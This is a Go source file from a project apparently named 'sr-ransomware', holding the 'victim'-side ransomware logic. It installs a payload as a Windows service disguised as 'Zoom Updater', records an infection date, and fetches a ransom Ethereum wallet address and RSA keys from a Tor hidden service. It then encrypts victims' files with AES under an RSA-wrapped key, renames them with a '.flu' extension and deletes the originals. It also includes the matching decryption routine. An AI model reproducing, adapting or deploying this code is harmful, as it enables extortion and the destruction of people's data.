package victim

import (
    "os"
    "io"
    "io/ioutil"
    "encoding/gob"
    "encoding/binary"
    "crypto/cipher"
    "crypto/rand"
    "crypto/rsa"
    "crypto/aes"
    "unsafe"
    "bufio"
    "time"

    "github.com/sug0/sr-ransomware/go/win"
    "github.com/sug0/sr-ransomware/go/exe"
    "github.com/sug0/sr-ransomware/go/errors"
    "github.com/sug0/sr-ransomware/go/crypto/util"
    "github.com/sug0/sr-ransomware/go/net/ratelimit"
)

func InstallPayload() error {
    _, err := ioutil.WriteFile(cryptoPayload, cryptoserviceBytes, 0744)
    if err != nil {
        return errors.Wrap(pkg, "failed to install payload", err)
    }
    err = win.InstallService("zoomupdater", "Zoom Updater", cryptoPayload)
    if err != nil {
        return errors.Wrap(pkg, "failed to install payload service", err)
    }
    return errors.WrapIfNotNil(pkg, "failed to start payload service", win.StartService("zoomupdater"))
}

// Register infection date.
func InfectionDate() (time.Time, error) {
    var t time.Time
    f, err := os.Open(victimInfectionDate)
    if err != nil {
        return t, errors.Wrap(pkg, "failed to open infection date file", err)
    }
    defer f.Close()
    err = gob.NewDecoder(bufio.NewReader(f)).Decode(&t)
    return t, errors.WrapIfNotNil(pkg, "failed to decode time", err)
}

// Checks if the victim should be infected.
func Infect() (bool, error) {
    if _, err := os.Stat(victimInfectionDate); err == nil {
        return false, nil
    }
    // create work dir
    err := os.Mkdir(workDir, os.ModePerm)
    if err != nil && !os.IsExist(err) {
        return false, errors.Wrap(pkg, "failed to create work dir", err)
    }
    // register infection date
    f, err := os.Create(victimInfectionDate)
    if err != nil {
        return false, errors.Wrap(pkg, "failed to create infection date file", err)
    }
    defer f.Close()
    w := bufio.NewWriter(f)
    err = gob.NewEncoder(w).Encode(time.Now())
    if err != nil {
        return false, errors.Wrap(pkg, "failed to encode with gob", err)
    }
    err = w.Flush()
    return err == nil, errors.WrapIfNotNil(pkg, "failed to flush buffer", err)
}

func DownloadKeysFromTor() error {
    // start tor in the background
    tor := exe.NewTor(torDirectory, "")
    err := tor.Start()
    if err != nil {
        return errors.Wrap(pkg, "failed to start tor", err)
    }
    defer tor.Close()

    // 32 ms --> limit to about 128 KiB/s
    client := ratelimit.NewHTTPClient(5 * time.Minute, 32 * time.Millisecond, true)

    rsp, err := client.Get(hiddenServiceOracle)
    if err != nil {
        return errors.Wrap(pkg, "failed to query hidden service oracle", err)
    }
    defer rsp.Body.Close()

    r := bufio.NewReader(rsp.Body)

    // read wallet addr
    fWallet, err := os.Create(victimEthereumWallet)
    if err != nil {
        return errors.Wrap(pkg, "failed to create ethereum wallet file", err)
    }
    defer fWallet.Close()

    _, err = io.Copy(fWallet, &io.LimitedReader{R: r, N: 42})
    if err != nil {
        return errors.Wrap(pkg, "failed to read wallet address", err)
    }

    // read public key
    fPub, err := os.Create(victimPublicKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to create pubkey file", err)
    }
    defer fPub.Close()

    var pubKeyLen int64

    err = binary.Read(r, binary.BigEndian, &pubKeyLen)
    if err != nil {
        return errors.Wrap(pkg, "failed to read pubkey len", err)
    }

    _, err = io.Copy(fPub, &io.LimitedReader{R: r, N: pubKeyLen})
    if err != nil {
        return errors.Wrap(pkg, "failed to read pubkey", err)
    }

    // read secret key
    fSec, err := os.Create(victimSecretKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to create seckey file", err)
    }
    defer fSec.Close()

    var secKeyLen int64

    err = binary.Read(r, binary.BigEndian, &secKeyLen)
    if err != nil {
        return errors.Wrap(pkg, "failed to read seckey len", err)
    }

    _, err = io.Copy(fSec, &io.LimitedReader{R: r, N: secKeyLen})
    if err != nil {
        return errors.Wrap(pkg, "failed to read pubkey", err)
    }

    return nil
}

func ImportSha1PublicKey() (string, error) {
    pkData, err := ioutil.ReadFile(victimPublicKey)
    if err != nil {
        return "", errors.Wrap(pkg, "failed to read RSA public key", err)
    }
    return util.Sha1Digest(pkData), nil
}

func ImportPublicKey() (*rsa.PublicKey, error) {
    pkData, err := ioutil.ReadFile(victimPublicKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to read RSA public key", err)
    }
    pk, err := util.ImportDERPublicKeyRSA(pkData)
    return pk, errors.WrapIfNotNil(pkg, "failed to import RSA public key", err)
}

func ImportSecretKey(aesIVKey []byte) (*rsa.PrivateKey, error) {
    skDataEncrypted, err := ioutil.ReadFile(victimSecretKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to read RSA secret key", err)
    }

    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
    aesStream := cipher.NewCTR(aesBlock, aesIVKey[:16])

    aesStream.XORKeyStream(skDataEncrypted, skDataEncrypted)
    skData, err := util.Unpad(skDataEncrypted)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to unpad secret key", err)
    }

    pk, err := util.ImportDERSecretKeyRSA(skData)
    return pk, errors.WrapIfNotNil(pkg, "failed to import RSA secret key", err)
}

func DecryptFile(sk *rsa.PrivateKey, path string) error {
    err := decryptFile(sk, path)
    if err != nil {
        return err
    }
    originalPath := path[:len(path)-4]
    originalSize, err := unpaddedSize(originalPath)
    if err != nil {
        return errors.Wrap(pkg, "failed to calculate new file size", err)
    }
    err = os.Truncate(originalPath, originalSize)
    if err != nil {
        return errors.Wrap(pkg, "failed to truncate file", err)
    }
    // remove original file
    return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
}

func unpaddedSize(path string) (int64, error) {
    f, err := os.Open(path)
    if err != nil {
        return 0, err
    }
    defer f.Close()
    _, err = f.Seek(-1, os.SEEK_END)
    if err != nil {
        return 0, err
    }
    var padSize [1]byte
    _, err = io.ReadFull(f, padSize[:])
    if err != nil {
        return 0, err
    }
    ent, err := f.Stat()
    if err != nil {
        return 0, err
    }
    return ent.Size()-int64(padSize[0]), nil
}

func decryptFile(sk *rsa.PrivateKey, path string) error {
    // the file to decrypt
    if len(path) < 5 || path[len(path)-4:] != ".flu" {
        return errNotFluFile
    }
    newpath := path[:len(path)-4]

    fEncrypted, err := os.Open(path)
    if err != nil {
        return errors.Wrap(pkg, "failed to open file", err)
    }
    defer fEncrypted.Close()

    // the file to restore
    fOriginal, err := os.Create(newpath)
    if err != nil {
        return errors.Wrap(pkg, "failed to create file", err)
    }
    defer fOriginal.Close()

    r := bufio.NewReader(fEncrypted)
    w := bufio.NewWriter(fOriginal)

    // compare magic
    var magic [16]byte

    _, err = io.ReadFull(r, magic[:])
    if err != nil {
        return errors.Wrap(pkg, "failed to read magic", err)
    }
    if invalidMagic(magic[:]) {
        return errNotFluFile
    }

    // read encrypted AES key
    var aesIVKeyEncrypted [rsaKeyBits/8]byte

    _, err = io.ReadFull(r, aesIVKeyEncrypted[:])
    if err != nil {
        return errors.Wrap(pkg, "failed to read AES key", err)
    }

    // decrypt AES key
    aesIVKey, err := rsa.DecryptPKCS1v15(rand.Reader, sk, aesIVKeyEncrypted[:])
    if err != nil {
        return errors.Wrap(pkg, "failed to decrypt AES key", err)
    }
    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
    aesStream := cipher.NewCTR(aesBlock, aesIVKey[:16])

    // decrypt file
    stream := cipher.StreamWriter{S: aesStream, W: w}
    _, err = io.Copy(stream, r)
    if err != nil {
        return errors.Wrap(pkg, "failed to decrypt file data", err)
    }

    return errors.WrapIfNotNil(pkg, "failed to flush buffer", w.Flush())
}

func invalidMagic(m []byte) bool {
    mp := (*[2]uint64)(unsafe.Pointer(&m[0]))
    return *mp != magicNumbers
}

func EncryptFile(pk *rsa.PublicKey, path string) error {
    err := encryptFile(pk, path)
    if err != nil {
        return err
    }
    // remove original file
    return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
}

func encryptFile(pk *rsa.PublicKey, path string) error {
    // new aes key
    aesIVKey, err := util.GenerateIVandKeyAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES key", err)
    }
    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
    aesStream := cipher.NewCTR(aesBlock, aesIVKey[:16])

    // load files
    fOriginal, err := os.Open(path)
    if err != nil {
        return errors.Wrap(pkg, "failed to open file", err)
    }
    defer fOriginal.Close()

    fEncrypted, err := os.Create(path + ".flu")
    if err != nil {
        return errors.Wrap(pkg, "failed to create file", err)
    }
    defer fEncrypted.Close()

    w := bufio.NewWriter(fEncrypted)

    // write magic
    _, err = io.WriteString(w, magicBytes)
    if err != nil {
        return errors.Wrap(pkg, "failed to write magic", err)
    }

    // write encrypted AES key
    encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, pk, aesIVKey)
    if err != nil {
        return errors.Wrap(pkg, "failed encrypt AES key", err)
    }
    _, err = w.Write(encryptedKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to write encrypted AES key", err)
    }

    // write encrypted file
    info, err := fOriginal.Stat()
    if err != nil {
        return errors.Wrap(pkg, "failed to stat file", err)
    }
    stream := cipher.StreamWriter{S: aesStream, W: w}
    _, err = io.Copy(stream, fOriginal)
    if err == nil {
        padding := util.GeneratePaddingBytes(int(info.Size()), aes.BlockSize)
        _, err = stream.Write(padding)
    }
    if err != nil {
        return errors.Wrap(pkg, "failed to encrypte file with AES", err)
    }

    return errors.WrapIfNotNil(pkg, "failed to flush buffer", w.Flush())
}
